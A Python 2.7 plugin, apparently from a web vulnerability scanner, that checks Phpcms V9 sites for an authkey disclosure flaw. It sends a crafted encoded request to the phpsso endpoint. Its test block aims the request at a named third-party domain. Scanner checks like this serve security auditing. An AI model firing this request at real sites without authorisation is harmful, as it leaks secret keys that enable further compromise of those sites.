#!/usr/bin/python2.7
#coding:utf-8

import requests
from dummy import *

info = {
	'NAME':'Phpcms V9 Authkey Print',
	'AUTHOR':'VER007,yangbh',
	'TIME':'20141102',
	'WEB':'https://www.yascanner.com/#!/n/120',
	'DESCRIPTION':''
}
opts = {
	'url':'http://testasp.vulnweb.com',	#'target ip'
}
# opts = [
# 	['url','http://testasp.vulnweb.com','target url']
# ]

def Assign(services):
	if services.has_key('url') and services.has_key('cms') and services['cms']=='phpCMS':
		if (services.has_key('cmsversion') and services['cmsversion'] == 'V9') or services.has_key('cmsversion')==False:
			return True
	return False

def Audit(services):
	url = services['url'] + '/phpsso_server/index.php?m=phpsso&c=index&a=getapplist&auth_data=v=1&appid=1&data=e5c2VAMGUQZRAQkIUQQKVwFUAgICVgAIAldVBQFDDQVcV0MUQGkAQxVZZlMEGA9+DjZoK1AHRmUwBGcOXW5UDgQhJDxaeQVnGAdxVRcKQ'
	rq = requests.get(url)
	if rq.status_code == 200 and 'authkey' in rq.text:
		security_hole(url)
# ----------------------------------------------------------------------------------------------------
#	untest yet
# ----------------------------------------------------------------------------------------------------
if __name__=='__main__':
	services = {'url':'http://www.eguan.cn','cms':'phpCMS'}
	pprint(Audit(services))
	pprint(services)